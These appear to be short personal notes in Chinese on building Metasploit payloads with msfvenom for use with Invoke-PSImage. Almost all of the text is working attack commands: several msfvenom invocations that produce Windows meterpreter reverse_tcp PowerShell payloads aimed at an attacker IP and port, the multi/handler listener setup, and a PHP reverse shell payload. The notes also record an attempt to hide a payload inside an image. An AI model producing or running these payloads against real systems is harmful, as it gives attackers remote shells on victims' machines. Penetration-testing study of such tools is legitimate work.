
[Invoke-PSImage利用分析](https://www.4hou.com/technology/9472.html)

[msf使用参考] (https://blog.csdn.net/nzjdsds/article/details/82929265)

'''fail
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.255.153 LPORT=2333 -f powershell  -o img.ps1 

msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.255.153 LPORT=2333 -f powershell  -o img2.ps1   

msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.255.153 LPORT=2333 -f powershell  -o img3.ps1  --smallest  

msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.255.153 LPORT=2333 -f powershell  -o img4.ps1  --smallest   
'''

success

```msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.255.153 LPORT=2333 -f psh-reflection  -o img.ps1 --smallest```

打开msf

```
use exploit/multi/handler
set LHOST 192.168.255.153
set LPORT 2333 
set PAYLOAD windows/x64/meterpreter/reverse_tcp
exploit
```

payload的选择取决于生成被控端文件用了什么模块，名字都是一样的

msfpayload php/reverse_php LHOST=x.x.x.x LPORT=2333 R > re.php

set PAYLOAD php/reverse_php

msf生成的payload执行可以反弹,但无法附加到生成的图片中执行
